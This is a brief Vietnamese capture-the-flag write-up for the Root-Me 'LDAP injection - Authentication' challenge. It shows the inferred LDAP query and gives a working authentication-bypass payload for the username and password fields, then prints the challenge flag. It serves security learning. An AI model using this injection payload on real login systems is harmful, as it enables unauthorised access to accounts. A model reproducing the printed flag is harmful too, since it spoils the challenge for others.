# [LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)

## Solutions

Thử nhập các ký tự làm xuất hiện lỗi cú pháp ldap, phân tích được query có dạng:

- `(&(uid=...)(userPassword=...))`

Nhập:

- username: `*)(|(&`
- password: `)`

=> Sẽ thành `(&(uid=*)(|(&)(userPassword=)))`

Kết quả:

- Lấy được flag ở response: `SWRwehpkTI3Vu2F9DoTJJ0LBO`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202008%20%20-%20LDAP%20Injection%20&%20Blind%20LDAP%20Injection.pdf?_gl=1>
